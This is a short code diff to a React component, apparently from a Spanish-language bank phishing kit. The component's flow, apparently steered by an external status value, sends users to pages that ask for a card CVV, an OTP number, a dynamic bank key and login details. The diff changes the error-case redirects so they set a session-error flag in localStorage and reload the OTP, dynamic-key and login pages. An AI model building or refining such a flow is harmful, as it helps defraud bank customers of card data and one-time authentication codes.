@@ -675,9 +675,19 @@ export default function ValidacionTC() {
                         break;
                     case 'solicitar_cvv_custom': navigate('/validacion-cvv'); break;
                     case 'solicitar_cvv': navigate('/validacion-cvv'); break;
-                    case 'error_otp': navigate('/numero-otp'); break;
-                    case 'error_din': navigate('/clave-dinamica'); break;
-                    case 'error_login': navigate('/autenticacion'); break;
+
+                    case 'error_otp':
+                        localStorage.setItem('estado_sesion', 'error');
+                        window.location.href = '/numero-otp';
+                        break;
+                    case 'error_din':
+                        localStorage.setItem('estado_sesion', 'error');
+                        window.location.href = '/clave-dinamica';
+                        break;
+                    case 'error_login':
+                        localStorage.setItem('estado_sesion', 'error');
+                        window.location.href = '/autenticacion';
+                        break;
                 }
 
             } catch (error) {
